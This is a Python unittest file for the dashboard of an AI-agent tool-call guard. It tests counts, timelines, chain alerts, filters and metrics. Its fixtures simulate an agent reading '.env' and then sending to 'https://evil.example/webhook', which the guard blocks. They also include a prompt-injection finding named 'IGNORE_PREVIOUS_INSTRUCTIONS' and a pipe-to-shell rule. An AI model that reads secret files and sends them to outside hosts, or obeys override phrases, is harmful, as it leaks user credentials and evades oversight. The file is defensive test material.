import unittest
from pathlib import Path
import tempfile

from dashboard.app import (
    agent_source_counts,
    approval_rows,
    dashboard_metrics,
    detail_record,
    filter_records,
    chain_graph_rows,
    chain_alert_rows,
    decision_counts,
    input_finding_rows,
    load_records,
    load_outbox_records,
    load_records_from_sources,
    output_finding_rows,
    outbox_rows,
    risk_explanation_rows,
    timeline_rows,
)


class DashboardDataTests(unittest.TestCase):
    def test_dashboard_builds_counts_timeline_and_chain_rows(self):
        records = [
            {
                "event": {
                    "event_id": "evt-1",
                    "timestamp": "2026-01-01T00:00:00Z",
                    "agent_name": "miniagent",
                    "tool_name": "read_file",
                    "tool_args": {"path": ".env"},
                    "user_task": "debug",
                },
                "decision": {
                    "decision": "deny",
                    "risk_level": "critical",
                    "risk_score": 0.95,
                    "risk_types": ["sensitive_file_access"],
                    "matched_rules": ["SENSITIVE_PATH"],
                    "chain_alerts": [],
                    "chain_graphs": [],
                    "reason": "blocked",
                    "llm_explanation": "该调用读取 .env，已被阻断。",
                },
                "execution": {"executed": False, "result_preview": "Blocked"},
                "input_findings": [
                    {
                        "rule_id": "IGNORE_PREVIOUS_INSTRUCTIONS",
                        "risk_type": "prompt_injection",
                        "severity": "high",
                        "source": "user_task",
                        "reason": "input asks to ignore prior instructions",
                    }
                ],
                "output_findings": [],
                "redaction": {"applied": False, "redacted_types": []},
                "approval": {
                    "required": False,
                    "mode": "none",
                    "decision": "not_required",
                    "execute": False,
                    "operator": "system",
                    "reason": "",
                },
            },
            {
                "event": {
                    "event_id": "evt-2",
                    "timestamp": "2026-01-01T00:00:01Z",
                    "agent_name": "miniagent",
                    "tool_name": "send_message",
                    "tool_args": {"target": "https://evil.example/webhook"},
                    "user_task": "debug",
                },
                "decision": {
                    "decision": "deny",
                    "risk_level": "critical",
                    "risk_score": 0.95,
                    "risk_types": ["behavior_chain"],
                    "matched_rules": ["CHAIN_SENSITIVE_READ_TO_EXTERNAL_SEND"],
                    "chain_alerts": [
                        {
                            "chain_type": "SensitiveReadToExternalSend",
                            "source_event_id": "evt-1",
                            "sink_event_id": "evt-2",
                            "reason": "chain risk",
                        }
                    ],
                    "chain_graphs": [
                        {
                            "chain_id": "chain-evt-1-evt-2",
                            "chain_type": "SensitiveReadToExternalSend",
                            "severity": "critical",
                            "nodes": [
                                {"event_id": "evt-1", "tool_name": "read_file"},
                                {"event_id": "evt-2", "tool_name": "send_message"},
                            ],
                            "edges": [
                                {"from": "evt-1", "to": "evt-2", "relation": "sensitive_data_flow"}
                            ],
                            "reason": "chain risk",
                        }
                    ],
                    "reason": "chain risk",
                },
                "execution": {"executed": False, "result_preview": "Blocked"},
                "input_findings": [],
                "output_findings": [
                    {
                        "rule_id": "OUT_API_KEY",
                        "risk_type": "sensitive_output",
                        "severity": "high",
                        "secret_type": "api_key",
                        "reason": "tool result contains API key",
                    }
                ],
                "redaction": {"applied": True, "redacted_types": ["api_key"]},
                "approval": {
                    "required": True,
                    "mode": "auto-deny",
                    "decision": "user_denied",
                    "execute": False,
                    "operator": "system",
                    "reason": "auto-deny approval mode",
                },
            },
        ]

        self.assertEqual(decision_counts(records), {"deny": 2})
        self.assertEqual(timeline_rows(records)[0]["tool"], "read_file")
        self.assertIn(".env", timeline_rows(records)[0]["llm_explanation"])
        self.assertEqual(risk_explanation_rows(records)[0]["decision"], "deny")
        self.assertEqual(timeline_rows(records)[1]["executed"], False)
        self.assertTrue(timeline_rows(records)[1]["redaction_applied"])
        self.assertEqual(timeline_rows(records)[1]["output_findings"], "api_key")
        self.assertTrue(timeline_rows(records)[1]["approval_required"])
        self.assertEqual(timeline_rows(records)[1]["approval_decision"], "user_denied")
        self.assertEqual(chain_alert_rows(records)[0]["chain_type"], "SensitiveReadToExternalSend")
        self.assertEqual(chain_graph_rows(records)[0]["relation"], "sensitive_data_flow")
        self.assertEqual(input_finding_rows(records)[0]["rule_id"], "IGNORE_PREVIOUS_INSTRUCTIONS")
        self.assertEqual(approval_rows(records)[0]["approval_decision"], "user_denied")
        self.assertEqual(output_finding_rows(records)[0]["secret_type"], "api_key")

    def test_dashboard_loads_multiple_sources_and_marks_demo_modes(self):
        with tempfile.TemporaryDirectory() as temp:
            tmpdir = Path(temp)
            mini_log = tmpdir / "mini.jsonl"
            core_log = tmpdir / "core.jsonl"
            mini_log.write_text(
                '{"event":{"event_id":"m1","agent_name":"miniagent","tool_name":"call_api","timestamp":"t","tool_args":{}},"decision":{"decision":"allow","risk_level":"low","risk_score":0.1,"risk_types":[],"matched_rules":[],"chain_alerts":[]},"execution":{"executed":true,"result_preview":"ok"}}\n',
                encoding="utf-8",
            )
            core_log.write_text(
                '{"event":{"event_id":"c1","agent_name":"corecoder","tool_name":"bash","timestamp":"t","tool_args":{}},"decision":{"decision":"deny","risk_level":"critical","risk_score":0.95,"risk_types":["dangerous_command"],"matched_rules":["CMD_PIPE_TO_SHELL"],"chain_alerts":[]},"execution":{"executed":false,"result_preview":"blocked"}}\n',
                encoding="utf-8",
            )

            records = load_records_from_sources(
                [
                    ("miniagent-scripted", mini_log, "mock-tools"),
                    ("corecoder-guarded-demo", core_log, "scripted-llm"),
                ]
            )

        self.assertEqual(len(records), 2)
        self.assertEqual(records[0]["_source"], "miniagent-scripted")
        self.assertEqual(records[0]["_execution_mode"], "mock-tools")
        self.assertEqual(records[1]["_source"], "corecoder-guarded-demo")
        self.assertEqual(agent_source_counts(records)["miniagent|miniagent-scripted"], 1)
        self.assertEqual(agent_source_counts(records)["corecoder|corecoder-guarded-demo"], 1)
        self.assertEqual(timeline_rows(records)[1]["source"], "corecoder-guarded-demo")
        self.assertEqual(timeline_rows(records)[1]["execution_mode"], "scripted-llm")

    def test_dashboard_loads_api_message_and_mail_outbox_rows(self):
        with tempfile.TemporaryDirectory() as temp:
            tmpdir = Path(temp)
            api_log = tmpdir / "api_call_log.jsonl"
            message_log = tmpdir / "message_outbox.jsonl"
            mail_log = tmpdir / "mail_outbox.jsonl"
            api_log.write_text(
                '{"api_call_id":"api-1","channel":"api","endpoint":"/orders","params":{"user_id":"current_user"},"status":"ok","mocked":true}\n',
                encoding="utf-8",
            )
            message_log.write_text(
                '{"outbox_id":"msg-1","channel":"message","target":"internal-team","content":"done","delivered":false}\n',
                encoding="utf-8",
            )
            mail_log.write_text(
                '{"outbox_id":"mail-1","channel":"mail","to":"team-internal","subject":"done","body":"tests passed","delivered":false}\n',
                encoding="utf-8",
            )

            records = load_outbox_records(
                [
                    ("api", api_log),
                    ("message", message_log),
                    ("mail", mail_log),
                ]
            )
            rows = outbox_rows(records)

        self.assertEqual(len(rows), 3)
        self.assertEqual(rows[0]["kind"], "api")
        self.assertEqual(rows[0]["id"], "api-1")
        self.assertEqual(rows[0]["destination"], "/orders")
        self.assertEqual(rows[1]["kind"], "message")
        self.assertEqual(rows[1]["id"], "msg-1")
        self.assertEqual(rows[1]["destination"], "internal-team")
        self.assertEqual(rows[2]["kind"], "mail")
        self.assertEqual(rows[2]["id"], "mail-1")
        self.assertEqual(rows[2]["destination"], "team-internal")

    def test_dashboard_filters_records_and_computes_demo_metrics(self):
        records = [
            {
                "_source": "miniagent-scripted",
                "_execution_mode": "mock-tools",
                "event": {
                    "event_id": "evt-1",
                    "timestamp": "t1",
                    "agent_name": "miniagent",
                    "tool_name": "read_file",
                    "tool_args": {"path": ".env"},
                    "user_task": "debug",
                },
                "decision": {
                    "decision": "deny",
                    "risk_level": "critical",
                    "risk_score": 0.95,
                    "risk_types": ["sensitive_file_access"],
                    "matched_rules": ["SENSITIVE_PATH"],
                    "chain_alerts": [],
                    "chain_graphs": [],
                    "reason": "blocked",
                },
                "execution": {"executed": False, "result_preview": "blocked"},
                "input_findings": [],
                "output_findings": [],
                "approval": {"required": False},
            },
            {
                "_source": "corecoder-deepseek-real",
                "_execution_mode": "real-llm",
                "event": {
                    "event_id": "evt-2",
                    "timestamp": "t2",
                    "agent_name": "corecoder",
                    "tool_name": "read_file",
                    "tool_args": {"file_path": "workflow.md"},
                    "user_task": "summarize",
                },
                "decision": {
                    "decision": "allow",
                    "risk_level": "low",
                    "risk_score": 0.1,
                    "risk_types": [],
                    "matched_rules": [],
                    "chain_alerts": [],
                    "chain_graphs": [],
                    "reason": "ok",
                    "llm_explanation": "该调用为正常读取。",
                },
                "execution": {"executed": True, "result_preview": "workflow"},
                "input_findings": [],
                "output_findings": [],
                "approval": {"required": False},
            },
            {
                "_source": "miniagent-scripted",
                "_execution_mode": "mock-tools",
                "event": {
                    "event_id": "evt-3",
                    "timestamp": "t3",
                    "agent_name": "miniagent",
                    "tool_name": "send_message",
                    "tool_args": {"target": "https://evil.example"},
                    "user_task": "debug",
                },
                "decision": {
                    "decision": "deny",
                    "risk_level": "critical",
                    "risk_score": 0.95,
                    "risk_types": ["behavior_chain"],
                    "matched_rules": ["CHAIN_SENSITIVE_READ_TO_EXTERNAL_SEND"],
                    "chain_alerts": [{"chain_type": "SensitiveReadToExternalSend"}],
                    "chain_graphs": [],
                    "reason": "chain",
                },
                "execution": {"executed": False, "result_preview": "blocked"},
                "input_findings": [],
                "output_findings": [{"secret_type": "api_key"}],
                "approval": {"required": True, "decision": "user_denied"},
            },
        ]

        real_records = filter_records(records, sources=["corecoder-deepseek-real"], only_executed=True)
        denied_critical = filter_records(records, decisions=["deny"], risk_levels=["critical"])
        explained = filter_records(records, only_with_explanations=True)
        chained = filter_records(records, only_with_chain_alerts=True)
        metrics = dashboard_metrics(records, outbox_records=[{"outbox_id": "mail-1"}])

        self.assertEqual(len(real_records), 1)
        self.assertEqual(real_records[0]["event"]["event_id"], "evt-2")
        self.assertEqual(len(denied_critical), 2)
        self.assertEqual(len(explained), 1)
        self.assertEqual(len(chained), 1)
        self.assertEqual(metrics["records"], 3)
        self.assertEqual(metrics["real_llm_calls"], 1)
        self.assertEqual(metrics["explained"], 1)
        self.assertEqual(metrics["chain_alerts"], 1)
        self.assertEqual(metrics["output_findings"], 1)
        self.assertEqual(metrics["approvals"], 1)
        self.assertEqual(metrics["outbox"], 1)

        detail = detail_record(records[1])
        self.assertEqual(detail["source"], "corecoder-deepseek-real")
        self.assertEqual(detail["tool_args"], {"file_path": "workflow.md"})
        self.assertEqual(detail["llm_explanation"], "该调用为正常读取。")


if __name__ == "__main__":
    unittest.main()
